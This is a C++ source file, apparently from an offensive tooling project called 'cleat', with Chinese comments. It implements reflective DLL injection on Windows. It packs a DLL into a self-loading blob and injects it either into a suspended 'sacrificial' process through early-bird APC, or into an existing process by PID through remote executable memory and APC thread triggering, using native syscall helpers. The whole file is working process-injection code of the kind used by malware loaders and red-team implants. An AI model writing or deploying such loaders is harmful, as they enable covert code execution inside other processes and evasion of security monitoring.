#include "Core/Inject/Methods/ReflectiveLoad/ReflectiveLoad.hpp"

#include "Core/Inject/PlatformWin_InjectCore.hpp"
#include "Core/Inject/RemoteMapper/PlatformWin_RemoteMapper.hpp"
#include "Core/Native/Win/Syscall.hpp"
#include "Common/Logger/ErrLog.hpp"
#include "Common/Logger/Logger.hpp"

namespace cleat {
namespace injection {

    InjectionResult ReflectiveLoad::Inject(const std::vector<uint8_t>& payload,
        PayloadKind payload_kind, const InjectionTarget& target) {
        InjectionResult result;
        if (payload_kind != PayloadKind::NativeDll) {
            result.error =
                "reflective_load only supports native_dll payload (hint: apc_injection for shellcode)";
            return result;
        }
        // 载荷准备: 裸 DLL → [boot][loader][PE](ShellcodeLoader 同源, 校验
        // fail-closed: 非 x64 PE32+/带 TLS 拒载)
        std::vector<uint8_t> blob;
        if (!PreparePayload(payload, payload_kind, blob, result.error)) {
            return result;
        }
#ifdef _WIN32
        if (target.kind == TargetKind::Spawn) {
            // 牺牲进程路径 = SpawnAndInject(CreateProcessW 挂起 + early-bird
            // APC + 清尸) —— 打包产物满足 Blob 契约, 直接走同一条已验证链路
            std::wstring imageW;
            if (target.image.empty() || !native::Utf8ToWideNT(target.image, imageW)) {
                result.error = "target encoding failed";
                return result;
            }
            const InjectionResult r = SpawnAndInject(imageW, blob,
#ifdef NDEBUG
                false
#else
                true   // Debug keep_on_fail: 保留牺牲进程现场
#endif
            );
            result.ok = r.ok;
            result.pid = r.pid;
            result.error = r.error;
            result.failed_at = r.failed_at;
            return result;
        }

        // pid 路径: 附着 → 落地 → APC 触发(attach 语义, 失败不清尸)
        void* hProcess = nullptr;
        result = AttachToPid(target.pid, &hProcess);
        if (!result.ok) {
            CLEAT_LOGE(ErrDom::Mod, ErrCode::PlatformApiFailed, "ReflectiveLoad: " << result.error << " (0x" << std::hex
                << result.failed_at << ")");
            return result;
        }
        void* base = nullptr;
        result = WriteExecutableMemory(hProcess, blob, &base);
        if (!result.ok) {
            native::Api().NtClose(hProcess);
            CLEAT_LOGE(ErrDom::Mod, ErrCode::PlatformApiFailed, "ReflectiveLoad: " << result.error << " (0x" << std::hex
                << result.failed_at << ")");
            return result;
        }
        result = TriggerApcNewThread(hProcess, base);
        native::Api().NtClose(hProcess);
        if (!result.ok) {
            CLEAT_LOGE(ErrDom::Mod, ErrCode::PlatformApiFailed, "ReflectiveLoad: " << result.error << " (0x" << std::hex
                << result.failed_at << ")");
            return result;
        }
        result.ok = true;
        result.pid = target.pid;
        LOG_INFO("ReflectiveLoad: 注入完成 target_pid=" << result.pid
            << " dll=" << payload.size() << "B");
        return result;
#else
        (void)target;
        result.error = "reflective_load is Windows-only";
        return result;
#endif
    }

} // namespace injection
} // namespace cleat
